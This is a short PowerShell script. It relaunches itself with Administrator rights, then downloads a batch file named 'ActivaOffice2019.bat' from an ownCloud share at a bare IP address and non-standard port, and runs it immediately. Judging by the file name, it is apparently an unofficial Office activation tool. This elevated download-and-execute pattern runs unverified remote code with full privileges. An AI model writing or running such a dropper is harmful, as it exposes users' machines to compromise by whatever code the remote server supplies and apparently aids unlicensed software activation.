if (-NOT([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
{
  $arguments = "& '" +$myinvocation.mycommand.definition + "'"
  Start-Process powershell -Verb runAs -ArgumentList $arguments
  Break
}
Set-Location C:\FTS_OFFICE
Invoke-WebRequest -Uri "http://200.1.25.137:65000/owncloud/s/t43X0GyrgFsWvqJ/download" -OutFile "c:\FTS_OFFICE\ActivaOffice2019.bat";
Start-Process c:\FTS_OFFICE\ActivaOffice2019.bat